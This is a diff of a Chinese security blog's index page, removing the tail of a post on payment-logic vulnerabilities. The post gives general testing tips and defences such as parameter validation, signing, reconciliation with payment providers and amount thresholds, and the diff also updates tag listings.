-<li>观察数据包<ul>
-<li>可能一个支付操作有三四个数据包，要对数据包进行仔细筛选。</li>
-</ul>
-</li>
-<li>分析数据包<ul>
-<li>要对数据包的中参数进行仔细分析。</li>
-</ul>
-</li>
-<li>发散思维<ul>
-<li>多站在开发者角度思考。</li>
-</ul>
-</li>
-<li>多尝试<ul>
-<li>PC端、Wap端(移动端)、App端。</li>
-</ul>
-</li>
-</ul>
-<h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><ul>
-<li>对支付过程的每一项参数进行检查校验。</li>
-<li>落实好与第三方支付平台的校验核对。</li>
-<li>支付参数进行MD5 加密、解密、数字签名及验证，避免数据修改，重放攻击中的各种问题。</li>
-<li>对交易金额设置阈值，进行人工审核，尽可能减小损失。</li>
-</ul>
-<p><br/><br/><br/></p>
-<blockquote>
-<p><font face="Georgia" color=#c4444>把握住传参就能把握住逻辑漏洞的命脉。</font></p>
-</blockquote>
-<p>作者：WebDogC<br>参考书籍《白帽子讲Web安全》</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逻辑、验证码、越权、支付、security、Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1264,6 +1146,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">复现、CTF、study、flag、文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">复现、CTF、study、flag、暴力破解</a>
               </li>
             
             <div class="clearfix"></div>
